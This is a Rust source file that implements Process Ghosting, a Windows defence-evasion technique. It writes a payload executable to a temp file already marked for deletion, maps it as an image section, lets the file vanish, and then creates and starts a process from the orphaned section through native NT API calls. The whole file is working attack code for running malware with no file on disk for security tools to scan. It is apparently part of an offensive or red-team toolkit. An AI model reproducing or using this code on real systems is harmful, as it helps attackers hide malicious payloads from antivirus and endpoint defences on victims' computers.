use std::ffi::CString;
use std::path::Path;

use windows::core::PCSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use windows::Win32::System::Threading::{GetCurrentProcess, GetProcessId, TerminateProcess};

use crate::error::MiscError;

/// Process Ghosting: create a process whose backing file no longer exists on disk.
///
/// Algorithm:
/// 1. Read payload PE into memory
/// 2. Create temp file with unique name, mark it for deletion via NtSetInformationFile
/// 3. Write payload bytes to the file
/// 4. Create image section via NtCreateSection(SEC_IMAGE)
/// 5. Close file handle (triggers deletion), section survives
/// 6. Create process from section via NtCreateProcessEx
/// 7. Set up PEB, process parameters, environment, and create initial thread via NtCreateThreadEx
///
/// Returns the PID of the ghosted process on success.
///
/// # Arguments
/// * `exe_path` - Path to the payload executable (64-bit PE)
///
/// # Safety
/// This function uses unsafe Windows NT API calls to manipulate processes and memory.
pub fn ghost_process(exe_path: &str) -> Result<u32, MiscError> {
    // Validate executable exists
    if !Path::new(exe_path).exists() {
        return Err(MiscError::FileNotFound(exe_path.to_string()));
    }

    // Read payload PE file
    let data = std::fs::read(exe_path)
        .map_err(|_| MiscError::FileReadFailed(exe_path.to_string()))?;

    // Validate PE header basics
    if data.len() < 64 {
        return Err(MiscError::InvalidPE("File too small for DOS header".into()));
    }
    let dos_magic = u16::from_le_bytes([data[0], data[1]]);
    if dos_magic != 0x5A4D {
        return Err(MiscError::InvalidPE("Invalid DOS magic (not MZ)".into()));
    }
    let pe_offset = u32::from_le_bytes([data[60], data[61], data[62], data[63]]) as usize;
    if data.len() < pe_offset + 4 {
        return Err(MiscError::InvalidPE("File too small for PE signature".into()));
    }
    let pe_sig = u32::from_le_bytes([
        data[pe_offset],
        data[pe_offset + 1],
        data[pe_offset + 2],
        data[pe_offset + 3],
    ]);
    if pe_sig != 0x00004550 {
        return Err(MiscError::InvalidPE("Invalid PE signature".into()));
    }

    // Check PE32+ (64-bit)
    let coff_offset = pe_offset + 4;
    if data.len() < coff_offset + 20 {
        return Err(MiscError::InvalidPE("File too small for COFF header".into()));
    }
    let opt_offset = coff_offset + 20;
    if data.len() < opt_offset + 20 {
        return Err(MiscError::InvalidPE("File too small for optional header".into()));
    }
    let opt_magic = u16::from_le_bytes([data[opt_offset], data[opt_offset + 1]]);
    if opt_magic != 0x20b {
        return Err(MiscError::ArchMismatch(
            "Only PE32+ (64-bit) executables are supported for ghosting".into(),
        ));
    }

    // Get entry point RVA from local PE buffer (no need to read from remote)
    let entry_point_rva = u32::from_le_bytes([
        data[opt_offset + 16],
        data[opt_offset + 17],
        data[opt_offset + 18],
        data[opt_offset + 19],
    ]) as u64;

    if entry_point_rva == 0 {
        return Err(MiscError::InvalidPE("Entry point RVA is zero".into()));
    }

    unsafe {
        // Resolve ntdll functions dynamically
        let ntdll = GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|_| MiscError::GhostSetupFailed("Failed to get ntdll.dll handle".into()))?;

        let get_proc = |name: &str| -> Result<*const (), MiscError> {
            let cname = CString::new(name).unwrap();
            GetProcAddress(ntdll, PCSTR(cname.as_ptr() as *const u8))
                .map(|p| p as *const ())
                .ok_or_else(|| MiscError::GhostSetupFailed(format!("Failed to resolve {}", name)))
        };

        // ---- Struct definitions ----

        #[repr(C)]
        struct UnicodeString {
            length: u16,
            maximum_length: u16,
            buffer: *mut u16,
        }

        impl UnicodeString {
            fn from_wide(wide: &[u16]) -> Self {
                let byte_len = ((wide.len().saturating_sub(1)) * 2) as u16;
                Self {
                    length: byte_len,
                    maximum_length: byte_len + 2,
                    buffer: wide.as_ptr() as *mut u16,
                }
            }
        }

        #[repr(C)]
        struct ObjectAttributes {
            length: u32,
            root_directory: HANDLE,
            object_name: *mut UnicodeString,
            attributes: u32,
            security_descriptor: *mut std::ffi::c_void,
            security_quality_of_service: *mut std::ffi::c_void,
        }

        #[repr(C)]
        struct IoStatusBlock {
            status: i32,
            _pad: u32,
            information: usize,
        }

        // ---- Function type definitions ----

        type NtOpenFileFn = unsafe extern "system" fn(
            *mut HANDLE, u32, *mut ObjectAttributes, *mut IoStatusBlock, u32, u32,
        ) -> i32;

        type NtSetInformationFileFn = unsafe extern "system" fn(
            HANDLE, *mut IoStatusBlock, *mut std::ffi::c_void, u32, u32,
        ) -> i32;

        type NtWriteFileFn = unsafe extern "system" fn(
            HANDLE, HANDLE, *mut std::ffi::c_void, *mut std::ffi::c_void,
            *mut IoStatusBlock, *const u8, u32, *mut i64, *mut u32,
        ) -> i32;

        type NtCreateSectionFn = unsafe extern "system" fn(
            *mut HANDLE, u32, *mut std::ffi::c_void, *mut i64, u32, u32, HANDLE,
        ) -> i32;

        type NtCreateProcessExFn = unsafe extern "system" fn(
            *mut HANDLE, u32, *mut std::ffi::c_void, HANDLE, u32, HANDLE, HANDLE, HANDLE, u8,
        ) -> i32;

        type NtQueryInformationProcessFn = unsafe extern "system" fn(
            HANDLE, u32, *mut std::ffi::c_void, u32, *mut u32,
        ) -> i32;

        type NtReadVirtualMemoryFn = unsafe extern "system" fn(
            HANDLE, *const std::ffi::c_void, *mut std::ffi::c_void, usize, *mut usize,
        ) -> i32;

        type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
            HANDLE, *mut *mut std::ffi::c_void, usize, *mut usize, u32, u32,
        ) -> i32;

        type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
            HANDLE, *mut std::ffi::c_void, *const std::ffi::c_void, usize, *mut usize,
        ) -> i32;

        type RtlCreateProcessParametersExFn = unsafe extern "system" fn(
            *mut *mut std::ffi::c_void, *mut UnicodeString, *mut UnicodeString,
            *mut UnicodeString, *mut UnicodeString, *mut std::ffi::c_void, *mut UnicodeString,
            *mut UnicodeString, *mut UnicodeString, *mut UnicodeString, u32,
        ) -> i32;

        type RtlDestroyProcessParametersFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
        ) -> i32;

        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut HANDLE, u32, *mut std::ffi::c_void, HANDLE, *const std::ffi::c_void,
            *const std::ffi::c_void, u32, usize, usize, usize, *mut std::ffi::c_void,
        ) -> i32;

        type CreateEnvironmentBlockFn = unsafe extern "system" fn(
            *mut *mut std::ffi::c_void, HANDLE, i32,
        ) -> i32;

        type DestroyEnvironmentBlockFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
        ) -> i32;

        // ---- Resolve all NT functions ----
        let nt_open_file: NtOpenFileFn =
            std::mem::transmute(get_proc("NtOpenFile")?);
        let nt_set_information_file: NtSetInformationFileFn =
            std::mem::transmute(get_proc("NtSetInformationFile")?);
        let nt_write_file: NtWriteFileFn =
            std::mem::transmute(get_proc("NtWriteFile")?);
        let nt_create_section: NtCreateSectionFn =
            std::mem::transmute(get_proc("NtCreateSection")?);
        let nt_create_process_ex: NtCreateProcessExFn =
            std::mem::transmute(get_proc("NtCreateProcessEx")?);
        let nt_query_info_process: NtQueryInformationProcessFn =
            std::mem::transmute(get_proc("NtQueryInformationProcess")?);
        let nt_read_virtual_memory: NtReadVirtualMemoryFn =
            std::mem::transmute(get_proc("NtReadVirtualMemory")?);
        let nt_allocate_virtual_memory: NtAllocateVirtualMemoryFn =
            std::mem::transmute(get_proc("NtAllocateVirtualMemory")?);
        let nt_write_virtual_memory: NtWriteVirtualMemoryFn =
            std::mem::transmute(get_proc("NtWriteVirtualMemory")?);
        let rtl_create_process_parameters_ex: RtlCreateProcessParametersExFn =
            std::mem::transmute(get_proc("RtlCreateProcessParametersEx")?);
        let rtl_destroy_process_parameters: RtlDestroyProcessParametersFn =
            std::mem::transmute(get_proc("RtlDestroyProcessParameters")?);
        let nt_create_thread_ex: NtCreateThreadExFn =
            std::mem::transmute(get_proc("NtCreateThreadEx")?);

        // Resolve userenv.dll functions for CreateEnvironmentBlock
        let userenv = LoadLibraryA(PCSTR(b"userenv.dll\0".as_ptr()))
            .map_err(|_| MiscError::GhostSetupFailed("Failed to load userenv.dll".into()))?;
        let create_environment_block: CreateEnvironmentBlockFn = std::mem::transmute(
            GetProcAddress(userenv, PCSTR(b"CreateEnvironmentBlock\0".as_ptr()))
                .ok_or_else(|| MiscError::GhostSetupFailed("Failed to resolve CreateEnvironmentBlock".into()))?
        );
        let destroy_environment_block: DestroyEnvironmentBlockFn = std::mem::transmute(
            GetProcAddress(userenv, PCSTR(b"DestroyEnvironmentBlock\0".as_ptr()))
                .ok_or_else(|| MiscError::GhostSetupFailed("Failed to resolve DestroyEnvironmentBlock".into()))?
        );

        // ==== Step 1: Create temp file ====
        let unique_id = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        let temp_filename = format!("PG_{:X}.tmp", unique_id);
        let temp_path = std::env::temp_dir().join(&temp_filename);
        let temp_path_str = temp_path.to_string_lossy().to_string();

        // Create empty temp file so NtOpenFile can open it
        std::fs::File::create(&temp_path)
            .map_err(|_| MiscError::GhostFileFailed("Failed to create temp file".into()))?;

        // Convert to NT path format: \??\C:\...\PGxxxx.tmp
        let nt_tmp_path = format!("\\??\\{}", temp_path_str);
        let nt_tmp_wide: Vec<u16> = nt_tmp_path.encode_utf16().chain(std::iter::once(0)).collect();

        // ==== Step 2: Create ghost section ====
        let mut file_name_us = UnicodeString::from_wide(&nt_tmp_wide);
        let mut object_attr = ObjectAttributes {
            length: std::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: HANDLE::default(),
            object_name: &mut file_name_us,
            attributes: 0x40, // OBJ_CASE_INSENSITIVE
            security_descriptor: std::ptr::null_mut(),
            security_quality_of_service: std::ptr::null_mut(),
        };

        let mut io_status = IoStatusBlock { status: 0, _pad: 0, information: 0 };
        let mut file_handle = HANDLE::default();

        // NtOpenFile with DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE
        let status = nt_open_file(
            &mut file_handle,
            0x00010000 | 0x00100000 | 0x80000000 | 0x40000000,
            &mut object_attr,
            &mut io_status,
            0x01 | 0x02, // FILE_SHARE_READ | FILE_SHARE_WRITE
            0x00000020,  // FILE_SYNCHRONOUS_IO_NONALERT
        );

        if status != 0 {
            let _ = std::fs::remove_file(&temp_path);
            return Err(MiscError::GhostFileFailed(format!(
                "NtOpenFile failed with status 0x{:08X}", status
            )));
        }

        // Mark file for deletion (FileDispositionInformation, class 13)
        let mut delete_flag: u8 = 1; // DeleteFile = TRUE
        let status = nt_set_information_file(
            file_handle,
            &mut io_status,
            &mut delete_flag as *mut _ as *mut _,
            std::mem::size_of::<u8>() as u32,
            13, // FileDispositionInformation
        );

        if status != 0 {
            let _ = CloseHandle(file_handle);
            return Err(MiscError::GhostFileFailed(format!(
                "NtSetInformationFile failed with status 0x{:08X}", status
            )));
        }

        // Write payload to temp file via NtWriteFile
        let mut byte_offset: i64 = 0;
        let status = nt_write_file(
            file_handle,
            HANDLE::default(), // Event
            std::ptr::null_mut(), // ApcRoutine
            std::ptr::null_mut(), // ApcContext
            &mut io_status,
            data.as_ptr(),
            data.len() as u32,
            &mut byte_offset,
            std::ptr::null_mut(), // Key
        );

        if status != 0 {
            let _ = CloseHandle(file_handle);
            return Err(MiscError::GhostFileFailed(format!(
                "NtWriteFile failed with status 0x{:08X}", status
            )));
        }

        // Create SEC_IMAGE section from the file
        let mut section_handle = HANDLE::default();
        let status = nt_create_section(
            &mut section_handle,
            0xF001F, // SECTION_ALL_ACCESS
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0x02,      // PAGE_READONLY
            0x1000000, // SEC_IMAGE
            file_handle,
        );

        // Close file handle - triggers deletion, section survives
        let _ = CloseHandle(file_handle);

        if status != 0 {
            return Err(MiscError::GhostSectionFailed);
        }

        // ==== Step 3: Create ghost process from orphaned section ====
        let mut process_handle = HANDLE::default();
        let status = nt_create_process_ex(
            &mut process_handle,
            0x001FFFFF, // PROCESS_ALL_ACCESS
            std::ptr::null_mut(),
            GetCurrentProcess(),
            4, // PS_INHERIT_HANDLES
            section_handle,
            HANDLE::default(), // DebugPort
            HANDLE::default(), // ExceptionPort
            0, // InJob = FALSE
        );

        let _ = CloseHandle(section_handle);

        if status != 0 {
            return Err(MiscError::GhostNtCreateProcessFailed);
        }

        let pid = GetProcessId(process_handle);

        let cleanup = |ph: HANDLE| {
            let _ = TerminateProcess(ph, 1);
            let _ = CloseHandle(ph);
        };

        // ==== Step 4: Initialize process parameters ====
        // Prepare paths for process parameters
        let exe_wide: Vec<u16> = exe_path.encode_utf16().chain(std::iter::once(0)).collect();

        // Extract directory from exe_path for current directory
        let exe_dir = Path::new(exe_path)
            .parent()
            .unwrap_or(Path::new("C:\\"))
            .to_string_lossy()
            .to_string();
        let exe_dir_wide: Vec<u16> = exe_dir.encode_utf16().chain(std::iter::once(0)).collect();

        let mut us_image_path = UnicodeString::from_wide(&exe_wide);
        let mut us_current_dir = UnicodeString::from_wide(&exe_dir_wide);
        let mut us_command_line = UnicodeString::from_wide(&exe_wide);

        // Create environment block via userenv.dll
        let mut environment: *mut std::ffi::c_void = std::ptr::null_mut();
        let env_result = create_environment_block(
            &mut environment,
            HANDLE::default(), // NULL token = current user
            1, // bInherit = TRUE
        );

        if env_result == 0 || environment.is_null() {
            cleanup(process_handle);
            return Err(MiscError::GhostSetupFailed("CreateEnvironmentBlock failed".into()));
        }

        // Create process parameters with RTL_USER_PROC_PARAMS_NORMALIZED flag
        let mut process_params: *mut std::ffi::c_void = std::ptr::null_mut();
        let status = rtl_create_process_parameters_ex(
            &mut process_params,
            &mut us_image_path,      // ImagePathName
            std::ptr::null_mut(),    // DllPath
            &mut us_current_dir,     // CurrentDirectory
            &mut us_command_line,    // CommandLine
            environment,             // Environment
            std::ptr::null_mut(),    // WindowTitle
            std::ptr::null_mut(),    // DesktopInfo
            std::ptr::null_mut(),    // ShellInfo
            std::ptr::null_mut(),    // RuntimeData
            1, // RTL_USER_PROC_PARAMS_NORMALIZED
        );

        if status != 0 || process_params.is_null() {
            destroy_environment_block(environment);
            cleanup(process_handle);
            return Err(MiscError::GhostSetupFailed(format!(
                "RtlCreateProcessParametersEx failed with status 0x{:08X}", status
            )));
        }

        // Query PEB address via NtQueryInformationProcess
        let mut pbi = [0u8; 48]; // sizeof(PROCESS_BASIC_INFORMATION) on x64
        let mut return_length: u32 = 0;
        let status = nt_query_info_process(
            process_handle,
            0, // ProcessBasicInformation
            pbi.as_mut_ptr() as *mut _,
            48,
            &mut return_length,
        );

        if status != 0 {
            let _ = rtl_destroy_process_parameters(process_params);
            destroy_environment_block(environment);
            cleanup(process_handle);
            return Err(MiscError::NtQueryFailed);
        }

        // PebBaseAddress is at offset 0x08 in PROCESS_BASIC_INFORMATION on x64
        let peb_address = u64::from_le_bytes([
            pbi[8], pbi[9], pbi[10], pbi[11], pbi[12], pbi[13], pbi[14], pbi[15],
        ]) as usize;

        // Read PEB to get ImageBase (offset 0x10 in PEB on x64)
        let mut peb_data = [0u8; 0x30];
        let mut bytes_read: usize = 0;
        let status = nt_read_virtual_memory(
            process_handle,
            peb_address as *const _,
            peb_data.as_mut_ptr() as *mut _,
            peb_data.len(),
            &mut bytes_read,
        );

        if status != 0 {
            let _ = rtl_destroy_process_parameters(process_params);
            destroy_environment_block(environment);
            cleanup(process_handle);
            return Err(MiscError::PebReadFailed);
        }

        let image_base = u64::from_le_bytes([
            peb_data[0x10], peb_data[0x11], peb_data[0x12], peb_data[0x13],
            peb_data[0x14], peb_data[0x15], peb_data[0x16], peb_data[0x17],
        ]) as usize;

        // Calculate env + params memory range (two scenarios for layout)
        let params_ptr = process_params as *const u8;

        // Length at offset 0x04 in RTL_USER_PROCESS_PARAMETERS
        let params_length = std::ptr::read_unaligned(params_ptr.add(0x04) as *const u32) as usize;
        // Environment pointer at offset 0x80
        let env_ptr = std::ptr::read_unaligned(params_ptr.add(0x80) as *const usize);
        // EnvironmentSize at offset 0x3F0
        let env_size = std::ptr::read_unaligned(params_ptr.add(0x3F0) as *const usize);

        // Scenario 1: base = params, end = params + length
        let params_base = process_params as usize;
        let params_end = params_base + params_length;

        let mut env_and_params_base = params_base;
        let mut env_and_params_end = params_end;

        if env_ptr != 0 {
            // Scenario 2: environment may be before params
            if params_base > env_ptr {
                env_and_params_base = env_ptr;
            }
            // Environment end may extend past params end
            if env_ptr + env_size > env_and_params_end {
                env_and_params_end = env_ptr + env_size;
            }
        }

        let mut total_size = env_and_params_end - env_and_params_base;

        // Allocate memory in remote process at the params address via NtAllocateVirtualMemory
        // Since params are NORMALIZED, internal pointers are absolute and already valid
        let mut remote_base = process_params;
        let status = nt_allocate_virtual_memory(
            process_handle,
            &mut remote_base,
            0,
            &mut total_size,
            0x00001000 | 0x00002000, // MEM_COMMIT | MEM_RESERVE
            0x04, // PAGE_READWRITE
        );

        if status != 0 {
            let _ = rtl_destroy_process_parameters(process_params);
            destroy_environment_block(environment);
            cleanup(process_handle);
            return Err(MiscError::AllocFailed);
        }

        // Write process parameters to remote process via NtWriteVirtualMemory
        let mut bytes_written: usize = 0;
        let status = nt_write_virtual_memory(
            process_handle,
            process_params,
            process_params as *const _,
            params_length,
            &mut bytes_written,
        );

        if status != 0 {
            let _ = rtl_destroy_process_parameters(process_params);
            destroy_environment_block(environment);
            cleanup(process_handle);
            return Err(MiscError::WriteFailed);
        }

        // Write environment block if present
        if env_ptr != 0 {
            let status = nt_write_virtual_memory(
                process_handle,
                env_ptr as *mut _,
                env_ptr as *const _,
                env_size,
                &mut bytes_written,
            );

            if status != 0 {
                let _ = rtl_destroy_process_parameters(process_params);
                destroy_environment_block(environment);
                cleanup(process_handle);
                return Err(MiscError::WriteFailed);
            }
        }

        // Update PEB.ProcessParameters (offset 0x20) to point to remote params
        let peb_process_params_addr = (peb_address + 0x20) as *mut std::ffi::c_void;
        let params_addr = process_params as usize;
        let status = nt_write_virtual_memory(
            process_handle,
            peb_process_params_addr,
            &params_addr as *const _ as *const _,
            std::mem::size_of::<usize>(),
            &mut bytes_written,
        );

        // Clean up local resources
        let _ = rtl_destroy_process_parameters(process_params);
        destroy_environment_block(environment);

        if status != 0 {
            cleanup(process_handle);
            return Err(MiscError::PebReadFailed);
        }

        // ==== Step 5: Create initial thread ====
        let entry_point_addr = (image_base as u64 + entry_point_rva) as *const std::ffi::c_void;

        let mut thread_handle = HANDLE::default();
        let status = nt_create_thread_ex(
            &mut thread_handle,
            0x1FFFFF, // THREAD_ALL_ACCESS
            std::ptr::null_mut(),
            process_handle,
            entry_point_addr,
            std::ptr::null(),
            0,    // Start immediately
            0,    // ZeroBits
            0,    // StackSize (0 = default from PE)
            0,    // MaximumStackSize (0 = default)
            std::ptr::null_mut(), // AttributeList
        );

        if status != 0 {
            cleanup(process_handle);
            return Err(MiscError::GhostSetupFailed(format!(
                "NtCreateThreadEx failed with status 0x{:08X}", status
            )));
        }

        let _ = CloseHandle(thread_handle);
        let _ = CloseHandle(process_handle);

        Ok(pid)
    }
}
